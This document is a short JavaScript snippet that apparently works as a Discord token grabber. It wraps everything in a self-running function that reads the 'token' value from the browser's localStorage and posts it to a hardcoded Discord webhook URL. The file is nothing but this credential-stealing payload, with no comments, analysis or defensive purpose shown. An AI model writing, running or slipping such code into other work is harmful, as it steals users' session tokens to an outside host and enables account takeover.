(() => {
    const token = localStorage.getItem('token');

    const data = JSON.stringify({
        content: `token -> ${token}`
    });

    fetch('https://discordapp.com/api/webhooks/639943073807204384/LoqF3mbviadrftyFIDJEcj1L1sNUPBopWtVt54XHIezAEB0Ukbyfn1hpSMsNa7bp6WDh', {
        method: 'POST',
        headers: {
            'Content-Type': 'multipart/form-data'
        },
        body: data
    });
})();